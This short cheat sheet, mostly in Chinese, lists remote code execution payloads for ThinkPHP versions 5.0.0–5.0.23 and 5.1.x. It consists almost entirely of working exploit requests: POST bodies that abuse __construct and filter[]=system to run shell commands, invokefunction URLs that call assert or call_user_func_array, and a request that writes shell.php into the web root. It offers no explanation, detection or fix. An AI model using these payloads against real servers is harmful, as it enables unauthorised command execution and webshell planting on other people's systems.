ThinkPHP 5.0.0~5.0.23 RCE 漏洞
payload-1：
http://127.0.0.1/public/index.php?s=captcha

POST:
_method=__construct&filter[]=system&method=get&get[]=whoami

payload-2：
http://127.0.0.1/public/index.php?s=captcha

POST:
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami

ThinkPHP 5.1 RCE

http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E
执行之后会在根目录下写入shell.php ，内容是输出phpinfo();


5.1.x php版本 > 5.5

http://127.0.0.1/index.php?s=index/think\request/input?data[]=phpinfo()&filter=assert
http://127.0.0.1/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&content=<?php%20phpinfo();?>


5.0.x php版本>=5.4
http://127.0.0.1/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()


